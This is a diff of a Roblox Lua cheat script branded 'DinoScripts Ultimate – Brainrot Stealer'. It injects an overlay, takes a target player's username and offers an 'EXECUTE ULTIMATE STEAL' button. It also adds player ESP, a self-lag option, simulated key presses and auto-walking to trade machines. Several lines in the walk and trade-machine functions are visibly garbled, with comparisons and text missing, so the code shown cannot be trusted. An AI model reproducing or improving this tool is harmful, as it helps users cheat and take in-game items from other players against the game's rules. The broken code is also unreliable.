@@ -13,6 +13,34 @@ local isMobile = UserInputService.TouchEnabled
 local isConsole = UserInputService.GamepadEnabled
 local platform = isMobile and "Mobile" or (isConsole and "Console" or "PC")
 
+-- Create minimap button
+local MinimapButton = Instance.new("Frame")
+MinimapButton.Name = "DinoScriptsMinimap"
+MinimapButton.Size = UDim2.new(0, 60, 0, 30)
+MinimapButton.Position = UDim2.new(0, 10, 0, 10)
+MinimapButton.BackgroundColor3 = Color3.fromRGB(0, 30, 0)
+MinimapButton.Active = true
+MinimapButton.Draggable = true
+MinimapButton.Parent = game.CoreGui
+
+local MinimapCorner = Instance.new("UICorner")
+MinimapCorner.CornerRadius = UDim.new(0, 6)
+MinimapCorner.Parent = MinimapButton
+
+local MinimapStroke = Instance.new("UIStroke")
+MinimapStroke.Color = Color3.fromRGB(0, 255, 0)
+MinimapStroke.Thickness = 2
+MinimapStroke.Parent = MinimapButton
+
+local MinimapLabel = Instance.new("TextLabel")
+MinimapLabel.Size = UDim2.new(1, 0, 1, 0)
+MinimapLabel.BackgroundTransparency = 1
+MinimapLabel.Text = "DinoScripts"
+MinimapLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+MinimapLabel.Font = Enum.Font.GothamBold
+MinimapLabel.TextSize = 12
+MinimapLabel.Parent = MinimapButton
+
 -- UI Creation
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "DinoScriptsUltimateUI"
@@ -21,13 +49,14 @@ ScreenGui.Parent = game.CoreGui
 -- Main UI Frame
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 400, 0, 500)
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+MainFrame.Size = UDim2.new(0, 350, 0, 420)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -210)
 MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.ClipsDescendants = true
+MainFrame.Visible = false
 MainFrame.Parent = ScreenGui
 
 -- Advanced Gradient Background
@@ -41,7 +70,6 @@ Gradient.Color = ColorSequence.new({
 Gradient.Rotation = 45
 Gradient.Parent = MainFrame
 
--- Animate gradient continuously
 spawn(function()
     while true do
         local tween = TweenService:Create(Gradient, TweenInfo.new(5, Enum.EasingStyle.Linear), {Rotation = 405})
@@ -54,7 +82,7 @@ end)
 -- Multi-color animated outline
 local Outline = Instance.new("UIStroke")
 Outline.Color = Color3.fromRGB(0, 255, 0)
-Outline.Thickness = 4
+Outline.Thickness = 3
 Outline.Transparency = 0.2
 Outline.Parent = MainFrame
 
@@ -77,54 +105,54 @@ end)
 
 -- Corner rounding
 local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.CornerRadius = UDim.new(0, 12)
 UICorner.Parent = MainFrame
 
 -- Title with advanced effects
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -20, 0, 45)
+Title.Size = UDim2.new(1, -20, 0, 35)
 Title.Position = UDim2.new(0, 10, 0, 10)
 Title.BackgroundTransparency = 1
 Title.Text = "DINOSCRIPTS ULTIMATE"
 Title.TextColor3 = Color3.fromRGB(0, 255, 0)
 Title.Font = Enum.Font.GothamBlack
-Title.TextSize = 24
+Title.TextSize = 20
 Title.TextStrokeTransparency = 0.6
 Title.TextStrokeColor3 = Color3.fromRGB(0, 80, 0)
 Title.Parent = MainFrame
 
 -- Subtitle with version
 local Subtitle = Instance.new("TextLabel")
-Subtitle.Size = UDim2.new(1, -20, 0, 25)
-Subtitle.Position = UDim2.new(0, 10, 0, 55)
+Subtitle.Size = UDim2.new(1, -20, 0, 20)
+Subtitle.Position = UDim2.new(0, 10, 0, 45)
 Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "BRAINROT STEALER v4.3 • FIXED"
+Subtitle.Text = "BRAINROT STEALER v4.4 • FIXED"
 Subtitle.TextColor3 = Color3.fromRGB(150, 255, 150)
 Subtitle.Font = Enum.Font.GothamBold
-Subtitle.TextSize = 14
+Subtitle.TextSize = 12
 Subtitle.Parent = MainFrame
 
 -- Made by Dino text
 local MadeByLabel = Instance.new("TextLabel")
-MadeByLabel.Size = UDim2.new(1, -20, 0, 20)
-MadeByLabel.Position = UDim2.new(0, 10, 0, 80)
+MadeByLabel.Size = UDim2.new(1, -20, 0, 18)
+MadeByLabel.Position = UDim2.new(0, 10, 0, 65)
 MadeByLabel.BackgroundTransparency = 1
 MadeByLabel.Text = "made by Dino"
 MadeByLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 MadeByLabel.Font = Enum.Font.GothamBold
-MadeByLabel.TextSize = 12
+MadeByLabel.TextSize = 11
 MadeByLabel.TextXAlignment = Enum.TextXAlignment.Right
 MadeByLabel.Parent = MainFrame
 
--- Current Target Display
+-- Target Display
 local TargetDisplay = Instance.new("Frame")
-TargetDisplay.Size = UDim2.new(1, -20, 0, 40)
-TargetDisplay.Position = UDim2.new(0, 10, 0, 105)
+TargetDisplay.Size = UDim2.new(1, -20, 0, 35)
+TargetDisplay.Position = UDim2.new(0, 10, 0, 85)
 TargetDisplay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 TargetDisplay.Parent = MainFrame
 
 local TargetDisplayCorner = Instance.new("UICorner")
-TargetDisplayCorner.CornerRadius = UDim.new(0, 8)
+TargetDisplayCorner.CornerRadius = UDim.new(0, 6)
 TargetDisplayCorner.Parent = TargetDisplay
 
 local TargetDisplayLabel = Instance.new("TextLabel")
@@ -133,48 +161,25 @@ TargetDisplayLabel.Position = UDim2.new(0, 5, 0, 5)
 TargetDisplayLabel.BackgroundTransparency = 1
 TargetDisplayLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TargetDisplayLabel.Font = Enum.Font.GothamBold
-TargetDisplayLabel.TextSize = 14
+TargetDisplayLabel.TextSize = 12
 TargetDisplayLabel.Text = "Target: None"
 TargetDisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
 TargetDisplayLabel.Parent = TargetDisplay
 
--- Trading Partner Display
-local PartnerDisplay = Instance.new("Frame")
-PartnerDisplay.Size = UDim2.new(1, -20, 0, 40)
-PartnerDisplay.Position = UDim2.new(0, 10, 0, 150)
-PartnerDisplay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-PartnerDisplay.Visible = false
-PartnerDisplay.Parent = MainFrame
-
-local PartnerDisplayCorner = Instance.new("UICorner")
-PartnerDisplayCorner.CornerRadius = UDim.new(0, 8)
-PartnerDisplayCorner.Parent = PartnerDisplay
-
-local PartnerDisplayLabel = Instance.new("TextLabel")
-PartnerDisplayLabel.Size = UDim2.new(1, -10, 1, -10)
-PartnerDisplayLabel.Position = UDim2.new(0, 5, 0, 5)
-PartnerDisplayLabel.BackgroundTransparency = 1
-PartnerDisplayLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
-PartnerDisplayLabel.Font = Enum.Font.GothamBold
-PartnerDisplayLabel.TextSize = 14
-PartnerDisplayLabel.Text = "Trading with: None"
-PartnerDisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
-PartnerDisplayLabel.Parent = PartnerDisplay
-
 -- Target Input Box
 local TargetBox = Instance.new("TextBox")
-TargetBox.Size = UDim2.new(1, -20, 0, 40)
-TargetBox.Position = UDim2.new(0, 10, 0, 195)
+TargetBox.Size = UDim2.new(1, -20, 0, 35)
+TargetBox.Position = UDim2.new(0, 10, 0, 125)
 TargetBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 TargetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TargetBox.Font = Enum.Font.Gotham
-TargetBox.TextSize = 16
+TargetBox.TextSize = 14
 TargetBox.PlaceholderText = "Enter target username..."
 TargetBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
 TargetBox.Parent = MainFrame
 
 local TargetBoxCorner = Instance.new("UICorner")
-TargetBoxCorner.CornerRadius = UDim.new(0, 8)
+TargetBoxCorner.CornerRadius = UDim.new(0, 6)
 TargetBoxCorner.Parent = TargetBox
 
 local TargetBoxStroke = Instance.new("UIStroke")
@@ -183,15 +188,15 @@ TargetBoxStroke.Thickness = 2
 TargetBoxStroke.Transparency = 0.4
 TargetBoxStroke.Parent = TargetBox
 
--- Start Search Button (NEW)
+-- Start Search Button
 local StartSearchButton = Instance.new("TextButton")
-StartSearchButton.Size = UDim2.new(1, -20, 0, 35)
-StartSearchButton.Position = UDim2.new(0, 10, 0, 240)
+StartSearchButton.Size = UDim2.new(1, -20, 0, 30)
+StartSearchButton.Position = UDim2.new(0, 10, 0, 165)
 StartSearchButton.BackgroundColor3 = Color3.fromRGB(0, 100, 150)
 StartSearchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 StartSearchButton.Font = Enum.Font.GothamBold
-StartSearchButton.TextSize = 14
-StartSearchButton.Text = "🔍 START SEARCH (Manual Mode)"
+StartSearchButton.TextSize = 13
+StartSearchButton.Text = "🔍 START SEARCH (Manual)"
 StartSearchButton.AutoButtonColor = false
 StartSearchButton.Parent = MainFrame
 
@@ -201,13 +206,13 @@ StartSearchCorner.Parent = StartSearchButton
 
 -- Status Container
 local StatusContainer = Instance.new("Frame")
-StatusContainer.Size = UDim2.new(1, -20, 0, 50)
-StatusContainer.Position = UDim2.new(0, 10, 0, 280)
+StatusContainer.Size = UDim2.new(1, -20, 0, 45)
+StatusContainer.Position = UDim2.new(0, 10, 0, 200)
 StatusContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 StatusContainer.Parent = MainFrame
 
 local StatusContainerCorner = Instance.new("UICorner")
-StatusContainerCorner.CornerRadius = UDim.new(0, 8)
+StatusContainerCorner.CornerRadius = UDim.new(0, 6)
 StatusContainerCorner.Parent = StatusContainer
 
 local StatusLabel = Instance.new("TextLabel")
@@ -216,106 +221,48 @@ StatusLabel.Position = UDim2.new(0, 5, 0, 5)
 StatusLabel.BackgroundTransparency = 1
 StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 StatusLabel.Font = Enum.Font.Gotham
-StatusLabel.TextSize = 13
+StatusLabel.TextSize = 12
 StatusLabel.TextWrapped = true
 StatusLabel.Text = "Status: Ready • Platform: "..platform.."\nPress Execute to begin"
 StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
 StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
 StatusLabel.Parent = StatusContainer
 
--- Animated status background
-local StatusGlow = Instance.new("Frame")
-StatusGlow.Size = UDim2.new(1, 0, 1, 0)
-StatusGlow.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
-StatusGlow.BackgroundTransparency = 0.85
-StatusGlow.ZIndex = -1
-StatusGlow.Parent = StatusContainer
-
-spawn(function()
-    while true do
-        TweenService:Create(StatusGlow, TweenInfo.new(2), {BackgroundTransparency = 0.9}):Play()
-        wait(2)
-        TweenService:Create(StatusGlow, TweenInfo.new(2), {BackgroundTransparency = 0.7}):Play()
-        wait(2)
-    end
-end)
-
--- Execute Button with advanced effects
+-- Execute Button
 local ExecuteButton = Instance.new("TextButton")
-ExecuteButton.Size = UDim2.new(1, -20, 0, 55)
-ExecuteButton.Position = UDim2.new(0, 10, 0, 335)
+ExecuteButton.Size = UDim2.new(1, -20, 0, 45)
+ExecuteButton.Position = UDim2.new(0, 10, 0, 250)
 ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 70, 0)
 ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ExecuteButton.Font = Enum.Font.GothamBlack
-ExecuteButton.TextSize = 18
+ExecuteButton.TextSize = 16
 ExecuteButton.Text = "⚡ EXECUTE ULTIMATE STEAL ⚡"
 ExecuteButton.AutoButtonColor = false
 ExecuteButton.Parent = MainFrame
 
 local ButtonCorner = Instance.new("UICorner")
-ButtonCorner.CornerRadius = UDim.new(0, 10)
+ButtonCorner.CornerRadius = UDim.new(0, 8)
 ButtonCorner.Parent = ExecuteButton
-
--- Button glow
-local ButtonGlow = Instance.new("Frame")
-ButtonGlow.Size = UDim2.new(1, 0, 1, 0)
-ButtonGlow.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-ButtonGlow.BackgroundTransparency = 0.9
-ButtonGlow.ZIndex = -1
-ButtonGlow.Parent = ExecuteButton
-
-local ButtonGlowCorner = Instance.new("UICorner")
-ButtonGlowCorner.CornerRadius = UDim.new(0, 10)
-ButtonGlowCorner.Parent = ButtonGlow
-
--- Animate button glow
-spawn(function()
-    while true do
-        TweenService:Create(ButtonGlow, TweenInfo.new(1.5), {BackgroundTransparency = 0.7}):Play()
-        wait(1.5)
-        TweenService:Create(ButtonGlow, TweenInfo.new(1.5), {BackgroundTransparency = 0.9}):Play()
-        wait(1.5)
-    end
-end)
-
--- Button hover effects
-ExecuteButton.MouseEnter:Connect(function()
-    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 90, 0)}):Play()
-    TweenService:Create(ButtonGlow, TweenInfo.new(0.2), {BackgroundTransparency = 0.5}):Play()
-end)
-
-ExecuteButton.MouseLeave:Connect(function()
-    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 70, 0)}):Play()
-    TweenService:Create(ButtonGlow, TweenInfo.new(0.2), {BackgroundTransparency = 0.9}):Play()
-end)
-
-StartSearchButton.MouseEnter:Connect(function()
-    TweenService:Create(StartSearchButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 180)}):Play()
-end)
-
-StartSearchButton.MouseLeave:Connect(function()
-    TweenService:Create(StartSearchButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 150)}):Play()
-end)
 
 -- Options Section
 local OptionsContainer = Instance.new("Frame")
-OptionsContainer.Size = UDim2.new(1, -20, 0, 100)
-OptionsContainer.Position = UDim2.new(0, 10, 0, 395)
+OptionsContainer.Size = UDim2.new(1, -20, 0, 80)
+OptionsContainer.Position = UDim2.new(0, 10, 0, 300)
 OptionsContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 OptionsContainer.Parent = MainFrame
 
 local OptionsCorner = Instance.new("UICorner")
-OptionsCorner.CornerRadius = UDim.new(0, 8)
+OptionsCorner.CornerRadius = UDim.new(0, 6)
 OptionsCorner.Parent = OptionsContainer
 
 -- Lag executor checkbox
 local LagCheckbox = Instance.new("TextButton")
-LagCheckbox.Size = UDim2.new(1, -10, 0, 25)
+LagCheckbox.Size = UDim2.new(1, -10, 0, 22)
 LagCheckbox.Position = UDim2.new(0, 5, 0, 5)
 LagCheckbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 LagCheckbox.TextColor3 = Color3.fromRGB(200, 200, 200)
 LagCheckbox.Font = Enum.Font.Gotham
-LagCheckbox.TextSize = 13
+LagCheckbox.TextSize = 12
 LagCheckbox.TextXAlignment = Enum.TextXAlignment.Left
 LagCheckbox.Text = "   ☐ Lag Executor (You)"
 LagCheckbox.AutoButtonColor = false
@@ -339,12 +286,12 @@ end)
 
 -- Player ESP checkbox
 local ESPCheckbox = Instance.new("TextButton")
-ESPCheckbox.Size = UDim2.new(1, -10, 0, 25)
-ESPCheckbox.Position = UDim2.new(0, 5, 0, 35)
+ESPCheckbox.Size = UDim2.new(1, -10, 0, 22)
+ESPCheckbox.Position = UDim2.new(0, 5, 0, 32)
 ESPCheckbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 ESPCheckbox.TextColor3 = Color3.fromRGB(200, 200, 200)
 ESPCheckbox.Font = Enum.Font.Gotham
-ESPCheckbox.TextSize = 13
+ESPCheckbox.TextSize = 12
 ESPCheckbox.TextXAlignment = Enum.TextXAlignment.Left
 ESPCheckbox.Text = "   ☐ Player ESP (T)"
 ESPCheckbox.AutoButtonColor = false
@@ -355,154 +302,75 @@ ESPCheckboxCorner.CornerRadius = UDim.new(0, 4)
 ESPCheckboxCorner.Parent = ESPCheckbox
 
 local espEnabled = false
-local espConnections = {}
-
 ESPCheckbox.MouseButton1Click:Connect(function()
     espEnabled = not espEnabled
     if espEnabled then
         ESPCheckbox.Text = "   ☑ Player ESP (T)"
         ESPCheckbox.BackgroundColor3 = Color3.fromRGB(0, 50, 100)
-        StatusLabel.Text = StatusLabel.Text.."\nESP Enabled - Press T to toggle"
     else
         ESPCheckbox.Text = "   ☐ Player ESP (T)"
         ESPCheckbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        StatusLabel.Text = StatusLabel.Text.."\nESP Disabled"
-        -- Clear ESP
-        for _, connection in pairs(espConnections) do
-            connection:Disconnect()
-        end
-        espConnections = {}
-        -- Remove ESP boxes
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                local char = player.Character
-                if char then
-                    local espBox = char:FindFirstChild("ESPBox")
-                    if espBox then
-                        espBox:Destroy()
-                    end
-                    local espName = char:FindFirstChild("ESPName")
-                    if espName then
-                        espName:Destroy()
-                    end
-                end
-            end
-        end
     end
 end)
 
 -- Info Text
 local InfoText = Instance.new("TextLabel")
-InfoText.Size = UDim2.new(1, -20, 0, 40)
-InfoText.Position = UDim2.new(0, 10, 0, 470)
+InfoText.Size = UDim2.new(1, -20, 0, 35)
+InfoText.Position = UDim2.new(0, 10, 0, 385)
 InfoText.BackgroundTransparency = 1
 InfoText.TextColor3 = Color3.fromRGB(180, 180, 180)
 InfoText.Font = Enum.Font.Gotham
-InfoText.TextSize = 11
+InfoText.TextSize = 10
 InfoText.TextWrapped = true
 InfoText.TextXAlignment = Enum.TextXAlignment.Left
 InfoText.TextYAlignment = Enum.TextYAlignment.Top
 InfoText.Text = "Advanced brainrot detection • Auto-walk • Multi-method\n5M+ filter • Lag options • Real-time target tracking"
 InfoText.Parent = MainFrame
 
--- Advanced particle system
-local ParticleContainer = Instance.new("Frame")
-ParticleContainer.Size = UDim2.new(1, 0, 1, 0)
-ParticleContainer.BackgroundTransparency = 1
-ParticleContainer.ZIndex = -1
-ParticleContainer.Parent = MainFrame
+-- Button hover effects
+ExecuteButton.MouseEnter:Connect(function()
+    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 90, 0)}):Play()
+end)
 
-local particles = {}
-for i = 1, 25 do
-    local particle = Instance.new("Frame")
-    particle.Size = UDim2.new(0, math.random(2, 6), 0, math.random(2, 6))
-    particle.BackgroundColor3 = Color3.fromRGB(
-        math.random(0, 50),
-        math.random(200, 255),
-        math.random(0, 50)
-    )
-    particle.BorderSizePixel = 0
-    particle.BackgroundTransparency = math.random(40, 80)/100
-    particle.Parent = ParticleContainer
+ExecuteButton.MouseLeave:Connect(function()
+    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 70, 0)}):Play()
+end)
 
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = particle
+StartSearchButton.MouseEnter:Connect(function()
+    TweenService:Create(StartSearchButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 180)}):Play()
+end)
 
-    particles[i] = {
-        frame = particle,
-        speedX = math.random(-150, 150)/100,
-        speedY = math.random(-150, 150)/100,
-        posX = math.random() * 0.9 + 0.05,
-        posY = math.random() * 0.9 + 0.05,
-        sizeSpeed = math.random(-50, 50)/100
-    }
-end
-
--- Animate particles
-spawn(function()
-    while true do
-        for _, p in ipairs(particles) do
-            p.posX = p.posX + p.speedX * 0.008
-            p.posY = p.posY + p.speedY * 0.008
-
-            -- Bounce off edges
-            if p.posX < 0.02 then p.posX = 0.02 p.speedX = math.abs(p.speedX) end
-            if p.posX > 0.98 then p.posX = 0.98 p.speedX = -math.abs(p.speedX) end
-            if p.posY < 0.02 then p.posY = 0.02 p.speedY = math.abs(p.speedY) end
-            if p.posY > 0.98 then p.posY = 0.98 p.speedY = -math.abs(p.speedY) end
-
-            p.frame.Position = UDim2.new(p.posX, -p.frame.AbsoluteSize.X/2, p.posY, -p.frame.AbsoluteSize.Y/2)
-
-            -- Size animation
-            local currentSize = p.frame.Size.X.Offset
-            local newSize = math.max(1, math.min(8, currentSize + p.sizeSpeed))
-            p.frame.Size = UDim2.new(0, newSize, 0, newSize)
-
-            if newSize <= 1 or newSize >= 8 then
-                p.sizeSpeed = -p.sizeSpeed
-            end
-
-            -- Fade animation
-            local targetTransparency = math.random(30, 90)/100
-            TweenService:Create(p.frame, TweenInfo.new(0.5), {BackgroundTransparency = targetTransparency}):Play()
-        end
-        wait(0.03)
-    end
+StartSearchButton.MouseLeave:Connect(function()
+    TweenService:Create(StartSearchButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 150)}):Play()
 end)
 
 -- UI toggle system
-local uiVisible = true
-local function toggleUI(show)
-    if show == uiVisible then return end
-    uiVisible = show
+local uiVisible = false
+local function toggleUI()
+    uiVisible = not uiVisible
 
-    if show then
+    if uiVisible then
         MainFrame.Visible = true
-        TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {
-            Size = UDim2.new(0, 400, 0, 500),
-            Position = UDim2.new(0.5, -200, 0.5, -250),
+        TweenService:Create(MainFrame, TweenInfo.new(0.3), {
+            Size = UDim2.new(0, 350, 0, 420),
+            Position = UDim2.new(0.5, -175, 0.5, -210),
             BackgroundTransparency = 0
         }):Play()
     else
-        TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {
+        TweenService:Create(MainFrame, TweenInfo.new(0.3), {
             Size = UDim2.new(0, 0, 0, 0),
             Position = UDim2.new(0.5, 0, 0.5, 0),
             BackgroundTransparency = 1
         }):Play()
-        wait(0.4)
+        wait(0.3)
         MainFrame.Visible = false
     end
 end
 
--- Toggle with CTRL (PC only)
-if not isMobile then
-    UserInputService.InputBegan:Connect(function(input)
-        if input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.RightControl then
-            toggleUI(not uiVisible)
-        end
-    end)
-end
+-- Minimap button click to show/hide UI
+MinimapButton.MouseButton1Click:Connect(function()
+    toggleUI()
+end)
 
 -- ESP Toggle with T key
 if not isMobile then
@@ -511,113 +379,23 @@ if not isMobile then
             espEnabled = not espEnabled
             ESPCheckbox.BackgroundColor3 = espEnabled and Color3.fromRGB(0, 50, 100) or Color3.fromRGB(30, 30, 30)
             ESPCheckbox.Text = espEnabled and "   ☑ Player ESP (T)" or "   ☐ Player ESP (T)"
-            
-            if espEnabled then
-                StatusLabel.Text = StatusLabel.Text.."\nESP Enabled"
-            else
-                StatusLabel.Text = StatusLabel.Text.."\nESP Disabled"
-                -- Clear ESP
-                for _, connection in pairs(espConnections) do
-                    connection:Disconnect()
-                end
-                espConnections = {}
-                -- Remove ESP boxes
-                for _, player in pairs(Players:GetPlayers()) do
-                    if player ~= LocalPlayer then
-                        local char = player.Character
-                        if char then
-                            local espBox = char:FindFirstChild("ESPBox")
-                            if espBox then
-                                espBox:Destroy()
-                            end
-                            local espName = char:FindFirstChild("ESPName")
-                            if espName then
-                                espName:Destroy()
-                            end
-                        end
-                    end
-                end
-            end
         end
     end)
 end
 
--- ESP Function
-local function updateESP()
-    if not espEnabled then return end
-    
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            local char = player.Character
-            if char then
-                local humanoidRootPart = char:FindFirstChild("HumanoidRootPart")
-                if humanoidRootPart then
-                    -- Create ESP box
-                    local espBox = char:FindFirstChild("ESPBox")
-                    if not espBox then
-                        espBox = Instance.new("BoxHandleAdornment")
-                        espBox.Name = "ESPBox"
-                        espBox.Adornee = humanoidRootPart
-                        espBox.AlwaysOnTop = true
-                        espBox.ZIndex = 10
-                        espBox.Size = Vector3.new(4, 6, 4)
-                        espBox.Color3 = Color3.fromRGB(0, 255, 0)
-                        espBox.Transparency = 0.7
-                        espBox.Parent = char
-                    end
-                    
-                    -- Create name label
-                    local espName = char:FindFirstChild("ESPName")
-                    if not espName then
-                        espName = Instance.new("BillboardGui")
-                        espName.Name = "ESPName"
-                        espName.Adornee = humanoidRootPart
-                        espName.AlwaysOnTop = true
-                        espName.Size = UDim2.new(0, 200, 0, 50)
-                        espName.ExtentsOffset = Vector3.new(0, 3, 0)
-                        espName.Parent = char
-                        
-                        local nameLabel = Instance.new("TextLabel")
-                        nameLabel.Size = UDim2.new(1, 0, 1, 0)
-                        nameLabel.BackgroundTransparency = 1
-                        nameLabel.Text = player.Name
-                        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-                        nameLabel.TextStrokeTransparency = 0
-                        nameLabel.TextSize = 14
-                        nameLabel.Font = Enum.Font.GothamBold
-                        nameLabel.Parent = espName
-                    end
-                end
-            end
-        end
-    end
-end
-
--- ESP update loop
-spawn(function()
-    while true do
-        if espEnabled then
-            updateESP()
-        end
-        wait(0.5)
-    end
-end)
-
--- E tuşuna basma fonksiyonu
+-- E key press function
 local function pressE()
     if isMobile then return end
-    
+
     VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, nil)
     wait(0.05)
     VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, nil)
 end
 
--- Lag executor fonksiyonu
+-- Lag executor function
 local function lagExecutor()
     StatusLabel.Text = StatusLabel.Text.."\nRunning lag executor..."
-    
-    -- FPS düşürücü döngü
+
     spawn(function()
         for i = 1, 100 do
             for x = 1, 10000 do
@@ -626,20 +404,9 @@ local function lagExecutor()
             wait(0.01)
         end
     end)
-    
-    -- Ağır hesaplamalar
-    spawn(function()
-        local startTime = tick()
-        while tick() - startTime < 5 do
-            for i = 1, 5000 do
-                local x = math.sin(i) * math.cos(i)
-            end
-            wait()
-        end
-    end)
 end
 
--- FIXED: Advanced walk function with pathfinding simulation
+-- Advanced walk function with pathfinding simulation
 local function walkToPosition(position)
     local character = LocalPlayer.Character
     if not character then return false end
@@ -652,80 +419,38 @@ local function walkToPosition(position)
     local startPos = rootPart.Position
     local distance = (position - startPos).Magnitude
 
-    if distance < 10 then
-        StatusLabel.Text = StatusLabel.Text.."\nAlready close to position"
-        return true
-    end
-
-    StatusLabel.Text = StatusLabel.Text.."\nWalking to position..."
-    
-    humanoid:MoveTo(position)
-    
-    local stepStartTime = tick()
-    while (rootPart.Position - position).Magnitude > 8 do
+    if distance  8 do
         if tick() - stepStartTime > 3 then break end -- Timeout per step
         wait(0.1)
     end
 
-    if (rootPart.Position - position).Magnitude <= 15 then
-        StatusLabel.Text = StatusLabel.Text.."\nReached position"
-        return true
-    else
-        StatusLabel.Text = StatusLabel.Text.."\nFailed to reach position"
-        return false
-    end
-end
-
--- Find trade machine in workspace - IMPROVED with better detection
-local function findTradeMachine()
-    StatusLabel.Text = StatusLabel.Text.."\nSearching for TRADE machine..."
-    
-    local machinesFound = {}
-    
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Part") or obj:IsA("Model") then
-            local name = obj.Name:lower()
-            local position = obj:IsA("Part") and obj.Position or (obj.PrimaryPart and obj.PrimaryPart.Position)
-            
-            if position and position.Y > 3 then -- Not underground
-                -- Trade machine detection scoring system
+    if (rootPart.Position - position).Magnitude  3 then -- Not underground
                 local score = 0
-                
-                -- Exact match bonus
+
                 if name:find("trade machine") then score = score + 20 end
                 if name:find("trading machine") then score = score + 15 end
                 if name:find("exchange machine") then score = score + 12 end
-                
-                -- Partial matches
+
                 if name:find("trade") and name:find("machine") then score = score + 10 end
                 if name:find("trade") then score = score + 8 end
                 if name:find("trading") then score = score + 7 end
                 if name:find("exchange") then score = score + 6 end
-                
-                -- Avoid shops and robux
+
                 if name:find("shop") then score = score - 15 end
                 if name:find("robux") then score = score - 15 end
                 if name:find("store") then score = score - 12 end
                 if name:find("buy") then score = score - 8 end
                 if name:find("sell") then score = score - 8 end
-                if name:find("cash") then score = score - 5 end
-                if name:find("money") then score = score - 5 end
-                
-                -- Visual indicators
+
                 if obj:IsA("Part") then
                     if obj.BrickColor.Name:lower():find("green") then score = score + 5 end
                     if obj.Material == Enum.Material.Neon then score = score + 4 end
-                    if obj.Transparency < 0.5 then score = score + 2 end
                 end
-                
-                -- Check for proximity to player
+
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                     local playerPos = LocalPlayer.Character.HumanoidRootPart.Position
                     local dist = (position - playerPos).Magnitude
-                    if dist < 100 then score = score + 5 end -- Bonus for nearby machines
-                end
-                
-                if score > 5 then -- Minimum score threshold
+                    if dist  5 then
                     table.insert(machinesFound, {
                         object = obj,
                         score = score,
@@ -737,12 +462,10 @@ local function findTradeMachine()
         end
     end
 
-    -- Sort by score (highest first)
     table.sort(machinesFound, function(a,b) return a.score > b.score end)
 
     if #machinesFound > 0 then
         StatusLabel.Text = "Status: Found "..#machinesFound.." TRADE machines"
-        -- Debug info about found machines
         for i=1, math.min(#machinesFound, 3) do
             StatusLabel.Text = StatusLabel.Text.."\n-"..machinesFound[i].name.." (score: "..machinesFound[i].score..")"
         end
@@ -753,38 +476,13 @@ local function findTradeMachine()
     return nil, nil
 end
 
--- FIXED: Safe mouse functions that don't crash the game
-local mousemoverel_safe_attempts = {}
-local mouse1click_safe_attempts = {}
-
+-- Safe mouse functions
 local function mousemoverel(x,y)
     if isMobile then return end
 
-    -- Track attempts to prevent spam crashes
-    local now = tick()
-    mousemoverel_safe_attempts[now] = true
-
-    -- Clean old attempts (older than 1 second)
-    for attemptTime in pairs(mousemoverel_safe_attempts) do
-        if now - attemptTime > 1 then
-            mousemoverel_safe_attempts[attemptTime] = nil
-        end
-    end
-
